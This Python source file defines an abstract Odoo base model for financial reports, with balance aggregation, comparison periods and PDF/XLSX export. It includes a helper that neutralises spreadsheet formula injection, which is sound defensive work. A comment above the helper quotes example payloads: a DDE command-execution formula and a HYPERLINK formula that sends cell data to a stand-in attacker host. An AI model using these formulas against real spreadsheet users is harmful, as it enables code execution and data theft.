# Copyright 2024 Enterprise Accounting Team
# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl).

"""
Financial Report Base Model

This module provides the base abstract model for all financial reports
in the Enterprise Accounting suite. It defines common fields, methods,
and report generation logic shared across Balance Sheet, P&L, Cash Flow,
General Ledger, Trial Balance, and Aged Partner Balance reports.

Technical Discovery Notes (per FR-001 through FR-007):
- Integrates with account.move and account.move.line for transaction data
- Uses account.account for chart of accounts classification
- Supports multi-company and multi-currency operations
- Provides comparative period analysis capabilities
- Enables drill-down to source transactions

Constraints Enforced:
- AGPL-3.0 license (this file)
- No Enterprise module dependencies
- OCA coding standards compliance
"""

import base64
import io
import logging

from openpyxl import Workbook
from openpyxl.styles import Alignment, Font
from openpyxl.utils import get_column_letter

from odoo import _, api, fields, models
from odoo.exceptions import UserError

# ---------------------------------------------------------------------------
# CSV / Formula Injection — Excel cell sanitisation helper
# (CP10 Issue #4 — MAJOR, Security / Output Encoding).
# ---------------------------------------------------------------------------
# OWASP reference: https://owasp.org/www-community/attacks/CSV_Injection
#
# When user-controllable text flows into a spreadsheet cell without
# sanitisation, and the cell value begins with any of the characters
# ``=``, ``+``, ``-``, ``@``, TAB (``\t``), or CR (``\r``), Microsoft
# Excel and LibreOffice Calc interpret the cell as a formula when the
# workbook is opened.  Attacker-controlled:
#
#   * ``res.partner.display_name`` (partner / customer / vendor name)
#   * ``account.move.line.name`` (journal entry description)
#   * ``account.move.line.ref`` (user-supplied reference)
#   * ``account.account.name`` (chart-of-accounts display name)
#   * ``res.company.name`` (company display name, emitted on the
#     Report Parameters sheet)
#
# can therefore:
#
#   * invoke DDE / ``=cmd|'/c calc'!A0`` on Excel (RCE on DDE-enabled hosts)
#   * exfiltrate data via ``=HYPERLINK("http://attacker/?d="&A1,...)``
#   * pull remote content via ``=IMPORTRANGE(...)`` on Google Sheets
#
# The industry-standard mitigation (OWASP, 2014 Dan Sharp writeup,
# Synopsys, Snyk) is to prefix any cell whose first character is in the
# dangerous-prefix set with an ASCII apostrophe (``'``).  Spreadsheet
# applications treat a leading apostrophe as a text indicator: the
# apostrophe is displayed in the formula bar but NOT in the cell body,
# so the intended text is preserved for human readers while formula
# interpretation is neutralised.
#
# The helper is module-level (not a method) because it has no ``self``
# dependency and is invoked on every cell write.  It is a pure function
# ``(value) -> value`` safe to call in tight loops.  Non-string values
# (int, float, datetime) are returned unchanged — they cannot carry a
# leading formula trigger — so numeric columns remain native numbers
# and continue to be formatted by openpyxl's ``monetary_fmt`` /
# ``percentage_fmt`` number-format strings.
_XLSX_FORMULA_PREFIXES = ('=', '+', '-', '@', '\t', '\r')


def _sanitize_xlsx_cell(value):
    """Neutralise CSV / formula-injection payloads before writing a cell.

    Returns a value that is safe to pass to
    ``openpyxl.worksheet.worksheet.Worksheet.cell(value=...)`` even when
    the original came from an attacker-controlled text field.

    :param value: The value that would be written to a cell.  May be any
        Python scalar — only ``str`` values are inspected; all other
        types (int, float, bool, datetime, None) are returned unchanged.
    :returns: The original value if it is not a string or does not start
        with a formula-triggering character; otherwise the same string
        with an ASCII apostrophe prefix.
    :rtype: Same as input (``str`` on the sanitised branch).
    """
    if isinstance(value, str) and value.startswith(_XLSX_FORMULA_PREFIXES):
        return "'" + value
    return value


class FinancialReportAbstract(models.AbstractModel):
    """
    Abstract base model for financial reports.

    This model provides common functionality for all financial reports:
    - Report parameter management (date ranges, comparison periods)
    - Account aggregation and classification
    - Multi-currency support
    - Export capabilities (PDF, Excel)
    - Drill-down navigation to source documents

    Per EPIC-001 User Stories:
    - CFO can generate GAAP/IFRS compliant reports
    - Accountant can verify with drill-down to transactions
    - Auditor can validate data integrity
    """
    _name = 'account.financial.report.abstract'
    _description = 'Financial Report Abstract Base'

    # -------------------------------------------------------------------------
    # REPORT CONFIGURATION FIELDS
    # -------------------------------------------------------------------------

    company_id = fields.Many2one(
        comodel_name='res.company',
        string='Company',
        required=True,
        default=lambda self: self.env.company,
        help="Company for which the report is generated.",
    )

    date_from = fields.Date(
        string='Start Date',
        help="Start date for the reporting period. "
             "For Balance Sheet, this is typically the fiscal year start.",
    )

    date_to = fields.Date(
        string='End Date',
        required=True,
        help="End date / As-of date for the report. "
             "Balance Sheet shows position as of this date.",
    )

    target_move = fields.Selection(
        selection=[
            ('posted', 'All Posted Entries'),
            ('all', 'All Entries'),
        ],
        string='Target Moves',
        required=True,
        default='posted',
        help="Select which journal entries to include in the report.",
    )

    # -------------------------------------------------------------------------
    # COMPARATIVE PERIOD FIELDS (per FR-001 Scenario 5)
    # -------------------------------------------------------------------------

    enable_comparison = fields.Boolean(
        string='Enable Comparison',
        default=False,
        help="Enable comparative period analysis.",
    )

    comparison_date_from = fields.Date(
        string='Comparison Start Date',
        help="Start date for the comparison period.",
    )

    comparison_date_to = fields.Date(
        string='Comparison End Date',
        help="End date for the comparison period.",
    )

    show_variance = fields.Boolean(
        string='Show Variance',
        default=True,
        help="Display variance columns (absolute and percentage).",
    )

    # -------------------------------------------------------------------------
    # TEMPLATE-FACING ALIASES
    # QWeb report templates reference ``compare_period``,
    # ``compare_date_from``, and ``compare_date_to`` while the canonical
    # field names use the ``enable_comparison`` / ``comparison_*`` prefix.
    # These ``related`` aliases ensure the QWeb directives
    # (``t-if="doc.compare_period"``, ``t-field="doc.compare_date_to"``)
    # resolve correctly without duplicating data.
    # -------------------------------------------------------------------------

    compare_period = fields.Boolean(
        related='enable_comparison',
        string='Compare Period',
        readonly=False,
    )

    compare_date_from = fields.Date(
        related='comparison_date_from',
        string='Compare Date From',
        readonly=False,
    )

    compare_date_to = fields.Date(
        related='comparison_date_to',
        string='Compare Date To',
        readonly=False,
    )

    # -------------------------------------------------------------------------
    # DISPLAY OPTIONS
    # -------------------------------------------------------------------------

    hierarchy_level = fields.Selection(
        selection=[
            ('all', 'All Levels'),
            ('summary', 'Summary Only'),
            ('detail', 'Detail with Transactions'),
        ],
        string='Display Level',
        default='all',
        help="Level of detail to display in the report.",
    )

    hide_zero_balance = fields.Boolean(
        string='Hide Zero Balance',
        default=False,
        help="Hide accounts with zero balance from the report.",
    )

    # -------------------------------------------------------------------------
    # REPORT STATE
    # -------------------------------------------------------------------------

    state = fields.Selection(
        selection=[
            ('draft', 'Draft'),
            ('done', 'Done'),
        ],
        string='State',
        default='draft',
        help="Current state of the report computation.",
    )

    # -------------------------------------------------------------------------
    # CURRENCY FIELDS
    # -------------------------------------------------------------------------

    currency_id = fields.Many2one(
        comodel_name='res.currency',
        string='Currency',
        help="Currency for report display. "
             "Defaults to company currency if not specified.",
    )

    # -------------------------------------------------------------------------
    # COMMON METHODS
    # -------------------------------------------------------------------------

    @api.model
    def _get_account_domain(self, account_types=None):
        """
        Build domain for filtering accounts.

        Args:
            account_types: List of account type codes to filter.
                          If None, returns all accounts.

        Returns:
            Domain list for account.account search.

        Technical Note:
            In Odoo 19.0, account.account uses company_ids (Many2many)
            instead of company_id.
        """
        domain = [('company_ids', 'in', self.company_id.ids)]
        if account_types:
            domain.append(('account_type', 'in', account_types))
        return domain

    @api.model
    def _get_move_line_domain(
        self, date_from=None, date_to=None, account_ids=None,
        journal_ids=None, partner_ids=None, analytic_account_ids=None,
    ):
        """Build domain for filtering journal items (account.move.line).

        Constructs a search domain that respects the report's configuration
        fields (company, target_move) and applies optional filters for date
        range, accounts, journals, partners, and analytic dimensions.

        Args:
            date_from: Start date for filtering (inclusive).
            date_to: End date for filtering (inclusive).
            account_ids: List of account IDs to include.
            journal_ids: Optional list of journal IDs to restrict results
                to specific journals (e.g. bank, sales).
            partner_ids: Optional list of partner IDs for partner-level
                filtering (used by Aged Partner Balance and General Ledger).
            analytic_account_ids: Optional list of analytic account IDs for
                analytic dimension filtering (referenced in wizard).

        Returns:
            Domain list for account.move.line search.

        Constraints:
            - Respects target_move selection (posted/all)
            - Filters by company_id for multi-company isolation
            - Supports multi-currency via amount_currency
        """
        domain = [
            ('company_id', '=', self.company_id.id),
        ]

        # Filter by move state
        if self.target_move == 'posted':
            domain.append(('parent_state', '=', 'posted'))

        # Date filters
        if date_from:
            domain.append(('date', '>=', date_from))
        if date_to:
            domain.append(('date', '<=', date_to))

        # Account filter
        if account_ids:
            domain.append(('account_id', 'in', account_ids))

        # Journal filter — allows report generation scoped to specific journals
        if journal_ids:
            domain.append(('journal_id', 'in', journal_ids))

        # Partner filter — enables partner-level drill-down for AR/AP reports
        if partner_ids:
            domain.append(('partner_id', 'in', partner_ids))

        # Analytic account filter — supports analytic dimension filtering
        if analytic_account_ids:
            domain.append(
                ('analytic_distribution', 'in', analytic_account_ids),
            )

        return domain

    def _compute_account_balance(
        self, accounts, date_from=None, date_to=None,
        journal_ids=None, partner_ids=None, analytic_account_ids=None,
    ):
        """Compute balance for a set of accounts using SQL-level aggregation.

        Aggregates debit, credit, and balance for the specified accounts within
        the given date range via ``_read_group`` for optimal performance on large
        datasets (target: <30 s for 100 000 transactions per FR-001 SLA).

        Args:
            accounts: Recordset of ``account.account`` records.
            date_from: Start date (optional — omit for cumulative BS accounts).
            date_to: End date (required for balance computation).
            journal_ids: Optional list of journal IDs for journal-level
                filtering (e.g. restricting to bank or sales journals).
            partner_ids: Optional list of partner IDs for partner-level
                filtering (used by Aged Partner Balance).
            analytic_account_ids: Optional list of analytic account IDs for
                analytic dimension scoping.

        Returns:
            Dict mapping ``account_id`` (int) to balance dict::

                {
                    account_id: {
                        'debit': total_debit,
                        'credit': total_credit,
                        'balance': total_balance,
                    }
                }

        Implementation Note:
            Balance Sheet accounts (Assets, Liabilities, Equity) use
            cumulative balance from inception to *date_to*.

            P&L accounts (Income, Expense) use period balance
            from *date_from* to *date_to*.
        """
        result = {}
        if not accounts:
            return result

        domain = self._get_move_line_domain(
            date_from=date_from,
            date_to=date_to,
            account_ids=accounts.ids,
            journal_ids=journal_ids,
            partner_ids=partner_ids,
            analytic_account_ids=analytic_account_ids,
        )

        # Use _read_group for efficient SQL-level aggregation — avoids loading
        # individual move lines into Python memory.
        # Odoo 19.0 API: _read_group returns list of tuples
        # (account_recordset, debit_sum, credit_sum, balance_sum)
        groups = self.env['account.move.line']._read_group(
            domain=domain,
            groupby=['account_id'],
            aggregates=['debit:sum', 'credit:sum', 'balance:sum'],
        )

        for account, debit_sum, credit_sum, balance_sum in groups:
            result[account.id] = {
                'debit': debit_sum or 0.0,
                'credit': credit_sum or 0.0,
                'balance': balance_sum or 0.0,
            }

        # Ensure all requested accounts are present in the result dict, even
        # when they have no journal items in the period (zero-balance rows).
        for account in accounts:
            if account.id not in result:
                result[account.id] = {
                    'debit': 0.0,
                    'credit': 0.0,
                    'balance': 0.0,
                }

        return result

    def _compute_variance(self, current_value, comparison_value):
        """
        Compute variance between current and comparison period values.

        Args:
            current_value: Value for current period
            comparison_value: Value for comparison period

        Returns:
            Dict with variance analysis:
            {
                'absolute': current_value - comparison_value,
                'percentage': percentage change (0 if comparison is 0),
            }

        Per FR-001 Scenario 5:
            "Variance columns showing absolute difference and percentage change"
        """
        absolute = current_value - comparison_value

        if comparison_value:
            percentage = (absolute / abs(comparison_value)) * 100
        else:
            percentage = 0.0 if current_value == 0 else 100.0

        return {
            'absolute': absolute,
            'percentage': round(percentage, 2),
        }

    def _validate_accounting_equation(self, assets, liabilities, equity):
        """
        Validate the fundamental accounting equation: Assets = Liabilities + Equity

        Per FR-001 Scenario 6:
            "total assets equals total liabilities plus total equity,
             confirming the fundamental accounting equation (A = L + E)"

        Args:
            assets: Total assets amount
            liabilities: Total liabilities amount
            equity: Total equity amount

        Returns:
            Dict with validation results:
            {
                'is_balanced': bool,
                'difference': amount (should be 0 if balanced),
            }
        """
        expected_total = liabilities + equity
        difference = round(assets - expected_total, 2)

        return {
            'is_balanced': difference == 0,
            'difference': difference,
        }

    # -------------------------------------------------------------------------
    # COMPARISON HELPERS
    # -------------------------------------------------------------------------

    def _prepare_comparison_data(self, accounts, journal_ids=None,
                                 partner_ids=None,
                                 analytic_account_ids=None):
        """Fetch comparison-period balances when ``enable_comparison`` is True.

        Centralises the logic for reading comparison dates from the report
        record and calling :meth:`_compute_account_balance` with those dates.
        Concrete report models should call this helper instead of duplicating
        comparison logic.

        Args:
            accounts: Recordset of ``account.account`` records to aggregate.
            journal_ids: Optional list of journal IDs passed through to
                :meth:`_compute_account_balance`.
            partner_ids: Optional list of partner IDs passed through.
            analytic_account_ids: Optional list of analytic account IDs.

        Returns:
            Dict mapping ``account_id`` to balance dict for the comparison
            period, or an empty dict when comparison is disabled.
        """
        self.ensure_one()
        if not self.enable_comparison:
            return {}

        if not self.comparison_date_to:
            raise UserError(
                _("Comparison end date is required when comparison is enabled."),
            )

        return self._compute_account_balance(
            accounts,
            date_from=self.comparison_date_from,
            date_to=self.comparison_date_to,
            journal_ids=journal_ids,
            partner_ids=partner_ids,
            analytic_account_ids=analytic_account_ids,
        )

    # -------------------------------------------------------------------------
    # EXPORT METHODS (per FR-007)
    # -------------------------------------------------------------------------

    def _get_report_xml_id(self):
        """Return the ``ir.actions.report`` XML ID for this report type.

        Subclasses **must** override this method to return the fully-qualified
        XML ID of their ``ir.actions.report`` record (e.g.
        ``'account_financial_report_ce.action_report_balance_sheet'``).

        The base implementation provides a mapping for all six concrete report
        models so that subclasses work out of the box without overriding, but
        subclasses may still override for custom behaviour.

        Returns:
            str: Fully-qualified XML ID, or ``False`` if no mapping exists.
        """
        report_map = {
            'account.balance.sheet.report':
                'account_financial_report_ce.action_report_balance_sheet',
            'account.profit.loss.report':
                'account_financial_report_ce.action_report_profit_loss',
            'account.cash.flow.report':
                'account_financial_report_ce.action_report_cash_flow',
            'account.general.ledger.report':
                'account_financial_report_ce.action_report_general_ledger',
            'account.trial.balance.report':
                'account_financial_report_ce.action_report_trial_balance',
            'account.aged.partner.balance.report':
                'account_financial_report_ce.action_report_aged_partner_balance',
        }
        return report_map.get(self._name, False)

    def action_print_pdf(self):
        """Export report to PDF format via QWeb rendering.

        Delegates to the ``ir.actions.report`` record identified by
        :meth:`_get_report_xml_id`.  Odoo's built-in ``wkhtmltopdf`` pipeline
        handles the actual PDF generation.

        Per FR-007 Acceptance Criteria:
            "Given I am viewing a financial report
             When I select Export to PDF
             Then I receive a PDF document with proper formatting"

        Performance target: <15 seconds for 100 000 transactions (rendering is
        handled by Odoo's ``wkhtmltopdf`` integration).

        Returns:
            An ``ir.actions.report`` action dict that triggers QWeb PDF
            rendering, or a generic fallback when no mapping exists.
        """
        self.ensure_one()
        report_xml_id = self._get_report_xml_id()
        if report_xml_id:
            report_action = self.env.ref(report_xml_id)
            return report_action.report_action(self, config=False)
        # Fallback for unmapped or custom report models
        return {
            'type': 'ir.actions.report',
            'report_name': 'account_financial_report_ce.report_generic',
            'report_type': 'qweb-pdf',
            'data': {'report_id': self.id},
        }

    # -------------------------------------------------------------------------
    # XLSX EXPORT HELPERS (overridable by subclasses)
    # -------------------------------------------------------------------------

    def _get_xlsx_columns(self):
        """Return column definitions for XLSX export.

        Each column is a dict with at least ``header`` (display name) and
        ``field`` (key in the row dict returned by :meth:`_get_xlsx_data`).
        Optional keys: ``width`` (int, in characters) and ``style``
        (``'monetary'``, ``'percentage'``, ``'text'``).

        Subclasses should override this method to provide report-specific
        column layouts (e.g. aging buckets for Aged Partner Balance).

        Returns:
            list[dict]: Column definitions.
        """
        cols = [
            {'header': _('Account Code'), 'field': 'code', 'width': 15,
             'style': 'text'},
            {'header': _('Account Name'), 'field': 'name', 'width': 40,
             'style': 'text'},
            {'header': _('Debit'), 'field': 'debit', 'width': 18,
             'style': 'monetary'},
            {'header': _('Credit'), 'field': 'credit', 'width': 18,
             'style': 'monetary'},
            {'header': _('Balance'), 'field': 'balance', 'width': 18,
             'style': 'monetary'},
        ]
        if self.enable_comparison:
            cols.extend([
                {'header': _('Comparison Amount'), 'field': 'comparison_amount',
                 'width': 20, 'style': 'monetary'},
                {'header': _('Variance'), 'field': 'variance_absolute',
                 'width': 18, 'style': 'monetary'},
                {'header': _('Variance %'), 'field': 'variance_percentage',
                 'width': 14, 'style': 'percentage'},
            ])
        return cols

    def _get_xlsx_data(self):
        """Return data rows for XLSX export.

        Each row is a dict whose keys match the ``field`` values returned by
        :meth:`_get_xlsx_columns`.  Rows should include a ``level`` key (int)
        for section-hierarchy indentation and an ``is_total`` key (bool) for
        bold formatting on total lines.

        The base implementation iterates over ``line_ids`` (if present on the
        concrete model).  Subclasses with different line structures should
        override this method.

        Returns:
            list[dict]: Data rows for the spreadsheet.
        """
        rows = []
        line_ids = getattr(self, 'line_ids', self.env['account.financial.report.line.abstract'])
        for line in line_ids:
            row = {
                'code': ', '.join(line.account_ids.mapped('code')) if line.account_ids else '',
                'name': line.name or '',
                'debit': 0.0,
                'credit': 0.0,
                'balance': line.amount or 0.0,
                'level': line.level or 0,
                'is_total': line.is_total,
            }
            if self.enable_comparison:
                row.update({
                    'comparison_amount': line.comparison_amount or 0.0,
                    'variance_absolute': line.variance_absolute or 0.0,
                    'variance_percentage': line.variance_percentage or 0.0,
                })
            rows.append(row)
        return rows

    def action_export_xlsx(self):
        """Export report to Excel (.xlsx) format using *openpyxl*.

        Builds an in-memory workbook, populates it with report line data
        returned by :meth:`_get_xlsx_data`, applies monetary/percentage
        formatting, section-hierarchy indentation, and appropriate column
        widths, then stores the result as an ``ir.attachment`` and returns a
        download URL action.

        Per FR-007 Acceptance Criteria:
            "Given I am viewing a financial report
             When I select Export to Excel
             Then I receive an XLSX file with data in tabular format"

        Performance target: <10 seconds for 100 000 transactions.

        Returns:
            ``ir.actions.act_url`` action dict pointing to the generated
            attachment download URL.
        """
        self.ensure_one()
        logger = logging.getLogger(__name__)

        columns = self._get_xlsx_columns()
        data_rows = self._get_xlsx_data()

        # --- Build workbook in memory ---
        wb = Workbook()
        ws = wb.active
        # Derive a human-readable sheet name from the report model description
        ws.title = (self._description or 'Financial Report')[:31]

        # -- Styles --
        header_font = Font(bold=True, size=11)
        total_font = Font(bold=True, size=10)
        monetary_fmt = '#,##0.00'
        percentage_fmt = '0.00"%"'

        # -- Column widths and headers (row 1) --
        # CP10 Issue #4 (MAJOR): column headers are typically localised
        # literal strings, but applying the sanitiser here is defensive —
        # if a subclass ever returns a header derived from user input
        # (e.g. a dynamic comparison-period header including a custom
        # company label), injection remains blocked.
        for col_idx, col_def in enumerate(columns, start=1):
            header_value = _sanitize_xlsx_cell(col_def['header'])
            cell = ws.cell(row=1, column=col_idx, value=header_value)
            cell.font = header_font
            cell.alignment = Alignment(horizontal='center', wrap_text=True)
            col_letter = get_column_letter(col_idx)
            ws.column_dimensions[col_letter].width = col_def.get('width', 15)

        # -- Data rows (row 2 onwards) --
        # CP10 Issue #4 (MAJOR, PRIMARY sink): ``row_data`` originates in
        # each report subclass's ``_get_xlsx_data`` and routinely includes
        # user-controllable strings — ``partner_id.display_name``,
        # ``move_line.name`` (journal entry description),
        # ``move_line.ref`` (user-supplied reference), and
        # ``account.account.name``.  Any of these can carry a formula
        # prefix and trigger Excel / LibreOffice / Google Sheets formula
        # execution on open.  ``_sanitize_xlsx_cell`` neutralises the
        # attack while preserving the original display text.  Native
        # int / float values used for monetary and percentage columns
        # flow through unchanged so openpyxl's number-format styling
        # continues to apply at lines below.
        for row_idx, row_data in enumerate(data_rows, start=2):
            level = row_data.get('level', 0)
            is_total = row_data.get('is_total', False)

            for col_idx, col_def in enumerate(columns, start=1):
                value = row_data.get(col_def['field'], '')
                cell = ws.cell(
                    row=row_idx,
                    column=col_idx,
                    value=_sanitize_xlsx_cell(value),
                )

                # Apply bold font for total lines
                if is_total:
                    cell.font = total_font

                # Section-hierarchy indentation on the name column
                if col_def['field'] == 'name' and level > 0:
                    cell.alignment = Alignment(indent=level * 2)

                # Number formatting based on column style.  Note: the
                # ``isinstance`` check on the ORIGINAL ``value`` is
                # intentional — the sanitiser only transforms strings
                # (monetary / percentage cells are native numerics and
                # are never rewritten), so the style branch remains
                # correct regardless of sanitisation.
                col_style = col_def.get('style', 'text')
                if col_style == 'monetary' and isinstance(value, (int, float)):
                    cell.number_format = monetary_fmt
                elif col_style == 'percentage' and isinstance(value, (int, float)):
                    cell.number_format = percentage_fmt

        # Freeze the header row for easier scrolling on large reports
        ws.freeze_panes = 'A2'

        # -- Report Parameters sheet (metadata for audit/traceability) --
        info_ws = wb.create_sheet(title='Report Parameters')
        info_font = Font(bold=True)
        param_rows = [
            (_('Company'), self.company_id.name or ''),
            (_('Date From'), str(self.date_from) if self.date_from else _('N/A')),
            (_('Date To'), str(self.date_to) if self.date_to else _('N/A')),
            (_('Target Moves'), self.target_move or ''),
            (_('Comparison Enabled'), _('Yes') if self.enable_comparison else _('No')),
        ]
        if self.enable_comparison:
            param_rows.extend([
                (_('Comparison From'), str(self.comparison_date_from) if self.comparison_date_from else _('N/A')),
                (_('Comparison To'), str(self.comparison_date_to) if self.comparison_date_to else _('N/A')),
            ])
        # CP10 Issue #4 (MAJOR, DEFENSIVE sink): the Report Parameters
        # sheet includes ``self.company_id.name`` — a user-writable
        # ``res.company.name`` Char field.  Apply the sanitiser to both
        # columns so a malicious company label cannot inject a formula
        # into the audit-trace metadata sheet.  ``label`` values are
        # localised literals and always safe, but the defensive call
        # keeps the write path uniform.
        for r_idx, (label, value) in enumerate(param_rows, start=1):
            label_cell = info_ws.cell(
                row=r_idx, column=1, value=_sanitize_xlsx_cell(label),
            )
            label_cell.font = info_font
            info_ws.cell(
                row=r_idx, column=2, value=_sanitize_xlsx_cell(value),
            )
        info_ws.column_dimensions['A'].width = 25
        info_ws.column_dimensions['B'].width = 35

        # -- Serialize workbook to bytes --
        output = io.BytesIO()
        wb.save(output)
        xlsx_data = output.getvalue()
        output.close()

        # -- Store as ir.attachment --
        report_label = self._description or self._name
        filename = '{report_name}_{date}.xlsx'.format(
            report_name=report_label.replace(' ', '_'),
            date=fields.Date.context_today(self),
        )
        attachment = self.env['ir.attachment'].create({
            'name': filename,
            'type': 'binary',
            'datas': base64.encodebytes(xlsx_data),
            'res_model': self._name,
            'res_id': self.id,
            'mimetype': 'application/vnd.openxmlformats-officedocument'
                        '.spreadsheetml.sheet',
        })

        logger.info(
            "XLSX export created: %s (%d data rows, %d bytes)",
            filename, len(data_rows), len(xlsx_data),
        )

        # Return a download action pointing to the attachment
        return {
            'type': 'ir.actions.act_url',
            'url': '/web/content/%d?download=true' % attachment.id,
            'target': 'new',
        }

    # -------------------------------------------------------------------------
    # DRILL-DOWN METHODS (per FR-007)
    # -------------------------------------------------------------------------

    def action_drilldown(self, account_id=None, date_from=None, date_to=None,
                         account_ids=None, partner_id=None):
        """Navigate to source transactions for a report line.

        Opens a filtered list of ``account.move.line`` records that underlie
        the clicked report amount, enabling auditors and accountants to verify
        reported figures down to individual journal items.

        Per FR-007 Acceptance Criteria:
            "Given I am viewing a financial report
             When I click on a line item amount
             Then I am navigated to a filtered view of the underlying
             journal entries that comprise that amount"

        Args:
            account_id: Single account ID to drill into (legacy parameter,
                kept for backward compatibility).
            date_from: Start date filter.
            date_to: End date filter.
            account_ids: List of account IDs for multi-account drill-down
                (e.g. a section total covering several accounts).  Takes
                precedence over *account_id* when both are supplied.
            partner_id: Optional partner ID for partner-level drill-down
                (required for Aged Partner Balance partner rows).

        Returns:
            ``ir.actions.act_window`` action dict with ``target='current'``
            for in-page navigation to the journal items list.

        Performance target: <2 seconds drill-down response time.
        """
        # Build the list of account IDs — prefer the list parameter
        effective_account_ids = account_ids or (
            [account_id] if account_id else []
        )

        # Build partner filter list
        effective_partner_ids = [partner_id] if partner_id else None

        domain = self._get_move_line_domain(
            date_from=date_from or self.date_from,
            date_to=date_to or self.date_to,
            account_ids=effective_account_ids or None,
            partner_ids=effective_partner_ids,
        )

        return {
            'name': _('Journal Items'),
            'type': 'ir.actions.act_window',
            'res_model': 'account.move.line',
            'view_mode': 'list,form',
            'domain': domain,
            'target': 'current',
            'context': {
                'search_default_posted': self.target_move == 'posted',
            },
        }

    # -------------------------------------------------------------------------
    # COMPUTATION ACTION
    # -------------------------------------------------------------------------

    def action_compute(self):
        """
        Compute report data and transition state to 'done'.

        This is the primary entry point for report generation. Delegates
        to _compute_report_data() which must be implemented by concrete
        subclasses.

        Returns:
            True to keep the wizard open with computed data.
        """
        self.ensure_one()
        self._compute_report_data()
        self.write({'state': 'done'})
        return True


class FinancialReportLine(models.AbstractModel):
    """
    Abstract model for financial report line items.

    This model represents a single line in a financial report,
    with support for hierarchical display and account aggregation.
    """
    _name = 'account.financial.report.line.abstract'
    _description = 'Financial Report Line Abstract'
    _order = 'sequence, id'

    sequence = fields.Integer(
        string='Sequence',
        default=10,
        help="Display order for the report line.",
    )

    name = fields.Char(
        string='Label',
        required=True,
        help="Display label for the report line.",
    )

    level = fields.Integer(
        string='Level',
        default=0,
        help="Hierarchy level (0 = root, higher = nested).",
    )

    parent_id = fields.Many2one(
        comodel_name='account.financial.report.line.abstract',
        string='Parent Line',
        help="Parent line for hierarchical reports.",
    )

    amount = fields.Monetary(
        string='Amount',
        currency_field='currency_id',
        help="Computed amount for this report line.",
    )

    comparison_amount = fields.Monetary(
        string='Comparison Amount',
        currency_field='currency_id',
        help="Amount for comparison period.",
    )

    variance_absolute = fields.Monetary(
        string='Variance',
        currency_field='currency_id',
        help="Absolute variance (current - comparison).",
    )

    variance_percentage = fields.Float(
        string='Variance %',
        help="Percentage variance.",
    )

    currency_id = fields.Many2one(
        comodel_name='res.currency',
        string='Currency',
    )

    account_ids = fields.Many2many(
        comodel_name='account.account',
        string='Accounts',
        help="Accounts included in this report line.",
    )

    is_total = fields.Boolean(
        string='Is Total Line',
        default=False,
        help="Indicates this is a total/subtotal line.",
    )
